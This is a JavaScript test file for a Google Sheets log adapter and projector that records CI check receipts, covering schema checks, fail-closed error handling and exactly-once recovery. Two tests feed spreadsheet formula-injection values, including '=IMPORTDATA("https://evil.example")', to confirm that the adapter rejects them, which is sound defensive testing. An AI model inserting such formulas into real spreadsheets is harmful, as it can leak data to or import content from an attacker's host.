import test from 'node:test';
import assert from 'node:assert/strict';
import { createGoogleSheetsLogAdapter, SheetsAdapterFault } from './google-sheets-adapter.mjs';
import { createSheetProjector, toSheetRow } from './sheet-projector.mjs';

const ID = '1sAIkAe_YSy_Wci7UyIMbXIlsYsfJLqGwIWWUu8EdNMs';
const hash = n => n.toString(16).repeat(64);
const receipt = (n=1,prev=hash(0)) => ({
  seq:n,source:'github-actions',
  event_id:'00000000-0000-4000-8000-'+String(n).padStart(12,'0'),
  tool_id:'github',command_id:'checks',outcome:'PASS',task_id:'S04-011',
  commit_sha:'a'.repeat(40),
  evidence_url:'https://github.com/dizigs/archelaos-site/actions/runs/123',
  server_at:Date.parse('2026-11-07T10:00:00.000Z'),
  prev_hash:prev,receipt_hash:hash(n),
});
const schema = ['EVENT_ID (immutable)','','','','','','EVIDENCE / SHA / PROVIDER_ID'];
function fake() {
  const records=[];
  const calls=[];
  let rowCount=1000, title='LOG', sheetId=1005, header=schema, appendError=null, updatedRows=null, forceReadError=null;
  const client={spreadsheets:{
    async get(args) {calls.push({kind:'metadata',args});return {data:{sheets:[{properties:{sheetId,title,gridProperties:{rowCount}}}]}};},
    values:{
      async get(args) {
        calls.push({kind:'get',args});
        if (forceReadError) throw forceReadError;
        if (args.range==="'LOG'!H1:N1") return {data:{values:[header]}};
        const m=/^'LOG'!H(\d+):N(\d+)$/.exec(args.range);
        if (!m) throw Error('unexpected range');
        const start=Number(m[1])-2, end=Number(m[2])-1;
        const rows=records.slice(start,end).map(row=>row.slice(7,14));
        return rows.length ? {data:{values:rows}} : {data:{}};
      },
      async append(args) {
        calls.push({kind:'append',args});
        const rows=args.requestBody.values;
        records.push(...rows.map(row=>[...row]));
        if (appendError) throw appendError;
        return {data:{updates:{updatedRows:updatedRows??rows.length}}};
      },
    },
  }};
  return {client,records,calls,
    setSheet: (name,id)=>{title=name;sheetId=id;},
    setHeader: value=>{header=value;},
    setCount: value=>{rowCount=value;},
    setAppendError: value=>{appendError=value;},
    setUpdatedRows: value=>{updatedRows=value;},
    setReadError: value=>{forceReadError=value;},
  };
}
const fault = code => e => e instanceof SheetsAdapterFault && e.code===code;
const adapter = f => createGoogleSheetsLogAdapter({client:f.client,spreadsheetId:ID});

test('reads a blank, legitimate Google Sheets values page',async()=>{
  const f=fake(), a=adapter(f);
  assert.deepEqual(await a.findByEventKeys(['github-actions:'+receipt().event_id]),[]);
  assert.equal(f.calls.filter(x=>x.kind==='get').length,2);
});

test('uses only existing LOG A:R RAW INSERT_ROWS and verifies H/N keys',async()=>{
  const f=fake(), a=adapter(f),r=toSheetRow(receipt());
  await a.appendRows([r]);
  const result=await a.findByEventKeys([r[7]]);
  assert.deepEqual(result,[{eventKey:r[7],receiptHash:r[13]}]);
  const sent=f.calls.find(x=>x.kind==='append').args;
  assert.equal(sent.spreadsheetId,ID);
  assert.equal(sent.range,"'LOG'!A:R");
  assert.equal(sent.valueInputOption,'RAW');
  assert.equal(sent.insertDataOption,'INSERT_ROWS');
  assert.equal(sent.requestBody.values[0].length,18);
});

test('does not silently remove duplicate IDs from readback',async()=>{
  const f=fake(),r=toSheetRow(receipt());f.records.push(r,r);
  const result=await adapter(f).findByEventKeys([r[7]]);
  assert.equal(result.length,2);
});

test('rejects wrong sheet identity and refuses provider writes',async()=>{
  const f=fake(),r=toSheetRow(receipt());
  f.setSheet('OTHER',1005);
  await assert.rejects(()=>adapter(f).appendRows([r]),fault('SHEET_TARGET_CHANGED'));
  assert.equal(f.calls.filter(x=>x.kind==='append').length,0);
});

test('rejects altered header before reading or writing',async()=>{
  const f=fake();f.setHeader(['legacy','','','','','','wrong']);
  await assert.rejects(()=>adapter(f).findByEventKeys(['github-actions:'+receipt().event_id]),fault('SHEET_SCHEMA_MISMATCH'));
});

test('rejects invalid event keys and duplicate requested IDs',async()=>{
  const f=fake(),a=adapter(f),key='github-actions:'+receipt().event_id;
  await assert.rejects(()=>a.findByEventKeys([key,key]),fault('INVALID_EVENT_KEYS'));
  await assert.rejects(()=>a.findByEventKeys(['=IMPORTDATA("url")']),fault('INVALID_EVENT_KEYS'));
  assert.equal(f.calls.length,0);
});

test('rejects non-RAW-safe cells and invalid receipt hash',async()=>{
  const f=fake(),a=adapter(f),r=toSheetRow(receipt());
  r[2]='=IMPORTDATA("https://evil.example")';
  await assert.rejects(()=>a.appendRows([r]),fault('INVALID_ROWS'));
  r[2]='github / checks';r[13]='bad';
  await assert.rejects(()=>a.appendRows([r]),fault('INVALID_ROWS'));
  assert.equal(f.calls.length,0);
});

test('fails closed on provider timeout after a committed append; readback survives',async()=>{
  const f=fake(),a=adapter(f),r=toSheetRow(receipt());
  f.setAppendError(Error('synthetic timeout after commit'));
  await assert.rejects(()=>a.appendRows([r]),/synthetic timeout/);
  assert.equal(f.records.length,1);
  assert.deepEqual(await a.findByEventKeys([r[7]]),[{eventKey:r[7],receiptHash:r[13]}]);
});

test('fails closed when provider does not confirm all appended rows',async()=>{
  const f=fake(),a=adapter(f),r=toSheetRow(receipt());
  f.setUpdatedRows(0);
  await assert.rejects(()=>a.appendRows([r]),fault('PROVIDER_APPEND_UNCONFIRMED'));
  assert.equal(f.records.length,1);
});

test('rejects unknown bounds and propagates failed provider reads',async()=>{
  const f=fake(),a=adapter(f),r=toSheetRow(receipt());
  f.setCount(50001);
  await assert.rejects(()=>a.findByEventKeys([r[7]]),fault('SHEET_BOUNDS_UNKNOWN'));
  f.setCount(1000);f.setReadError(Error('synthetic Google 403'));
  await assert.rejects(()=>a.findByEventKeys([r[7]]),/403/);
});

test('projector and Sheet adapter recover exactly once after lost append acknowledgement',async()=>{
  const f=fake();
  const a=adapter(f);
  const r=receipt();
  let state={seq:0,hash:hash(0)},locked=false;
  const checkpoint={
    async read(){return {...state};},
    async compareAndSet(prev,next){
      if(state.seq!==prev.seq || state.hash!==prev.hash)return false;
      state={...next};return true;
    },
  };
  const gate={async runExclusive(fn){
    if(locked)throw Error('busy');
    locked=true;try{return await fn();}finally{locked=false;}
  }};
  const p=createSheetProjector({
    source:{async list({after}){return after===0?[r]:[];}},
    sheet:a,checkpoint,gate,
  });
  f.setAppendError(Error('after commit'));
  await assert.rejects(()=>p.projectOnce(),/after commit/);
  assert.equal(state.seq,0);
  assert.equal(f.records.length,1);
  f.setAppendError(null);
  assert.deepEqual(await p.projectOnce(),{status:'VERIFIED',checked:1,appended:0,checkpoint:1});
  assert.equal(f.records.length,1);
});
